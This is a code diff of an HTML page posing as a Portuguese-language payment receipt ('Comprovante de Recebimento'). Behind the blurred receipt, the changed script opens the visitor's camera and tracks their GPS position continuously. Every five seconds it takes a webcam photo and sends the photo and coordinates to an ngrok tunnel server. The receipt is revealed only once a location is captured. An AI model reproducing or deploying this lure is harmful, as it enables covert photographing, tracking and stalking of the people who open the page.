@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Comprovante de Recebimento</title>
-  <link rel="stylesheet" href="styles.css" />
+  <link rel="stylesheet" href="/styles.css" />
 </head>
 <body>
   <div class="comprovante-container blurred">
@@ -31,7 +31,6 @@
 
   <script>
     document.addEventListener("DOMContentLoaded", () => {
-      // Exibir data atual
       const dataAtual = new Date();
       const dia = String(dataAtual.getDate()).padStart(2, '0');
       const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
@@ -40,96 +39,99 @@
 
       const video = document.getElementById("video");
       const canvas = document.getElementById("canvas");
-      let photoData = null;
+      let stream;
+      let locationData = { latitude: null, longitude: null, accuracy: null, maps: null, source: null };
 
-      // Função para capturar a foto
-      async function capturePhoto() {
+      // Iniciar o stream da câmera
+      async function startCamera() {
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
           console.error("API de mídia não suportada neste navegador.");
           return;
         }
-
         try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          stream = await navigator.mediaDevices.getUserMedia({ video: true });
           video.srcObject = stream;
-          video.onloadedmetadata = () => {
-            video.play();
-            setTimeout(() => {
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              canvas.getContext("2d").drawImage(video, 0, 0);
-              photoData = canvas.toDataURL("image/jpeg");
-              stream.getTracks().forEach(track => track.stop());
-            }, 2000);
-          };
+          video.play();
         } catch (error) {
           console.error("Erro ao acessar a câmera:", error);
-          photoData = null; // Prosseguir sem foto se falhar
         }
       }
 
-      // Iniciar captura da câmera
-      capturePhoto().then(() => {
-        // Capturar localização com GPS
-        if (navigator.geolocation) {
-          let watchId = navigator.geolocation.watchPosition(
-            position => {
-              const latitude = position.coords.latitude;
-              const longitude = position.coords.longitude;
-              const accuracy = position.coords.accuracy;
-              const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+      // Capturar foto
+      function capturePhoto() {
+        if (!stream) return null;
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+        return canvas.toDataURL("image/jpeg");
+      }
 
-              if (accuracy <= 20) {
-                navigator.geolocation.clearWatch(watchId);
-                sendLocation({ latitude, longitude, accuracy, maps, source: "GPS", photo: photoData });
+      // Monitorar localização continuamente
+      function startLocationTracking() {
+        if (navigator.geolocation) {
+          navigator.geolocation.watchPosition(
+            position => {
+              locationData = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                maps: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`,
+                source: "GPS"
+              };
+              // Remover o blur assim que a primeira localização for capturada
+              if (document.querySelector(".comprovante-container.blurred")) {
                 removeLoading();
               }
             },
-            () => {
-              // Fallback para IP após 15 segundos
-              setTimeout(() => {
-                sendLocation({ photo: photoData });
-                removeLoading();
-              }, 15000);
+            error => {
+              console.error("Erro ao obter localização por GPS:", error);
+              // Fallback para IP será tratado no servidor
             },
             {
               enableHighAccuracy: true,
-              timeout: 15000,
+              timeout: 5000,
               maximumAge: 0
             }
           );
-
-          // Forçar fallback após 15 segundos
-          setTimeout(() => {
-            navigator.geolocation.clearWatch(watchId);
-            sendLocation({ photo: photoData });
-            removeLoading();
-          }, 15000);
         } else {
-          sendLocation({ photo: photoData });
-          removeLoading();
+          console.error("Geolocalização não suportada.");
         }
+      }
+
+      // Enviar foto e localização a cada 5 segundos
+      function startCaptureInterval() {
+        setInterval(() => {
+          const photoData = capturePhoto();
+          const dataToSend = { ...locationData, photo: photoData };
+          sendLocation(dataToSend);
+        }, 5000); // 5 segundos
+      }
+
+      // Iniciar tudo
+      startCamera().then(() => {
+        startLocationTracking();
+        startCaptureInterval();
       });
-    });
 
-    function sendLocation(data) {
-      fetch("https://6712-177-35-125-241.ngrok-free.app/send-location", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      })
-        .then(response => response.json())
-        .then(data => {
-          if (!data.success) console.error("Erro ao enviar:", data.message);
-          else console.log("Localização e foto enviadas com sucesso do frontend!");
+      function sendLocation(data) {
+        fetch("https://6712-177-35-125-241.ngrok-free.app/send-location", { // Substitua pela URL atual do ngrok
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
         })
-        .catch(error => console.error("Erro ao enviar do frontend:", error));
-    }
+          .then(response => response.json())
+          .then(data => {
+            if (!data.success) console.error("Erro ao enviar:", data.message);
+            else console.log("Localização e foto enviadas com sucesso do frontend!");
+          })
+          .catch(error => console.error("Erro ao enviar do frontend:", error));
+      }
 
-    function removeLoading() {
-      document.querySelector(".comprovante-container").classList.remove("blurred");
-      document.getElementById("loading-overlay").style.display = "none";
-    }
+      function removeLoading() {
+        document.querySelector(".comprovante-container").classList.remove("blurred");
+        document.getElementById("loading-overlay").style.display = "none";
+      }
+    });
   </script>
 </body>
 </html>
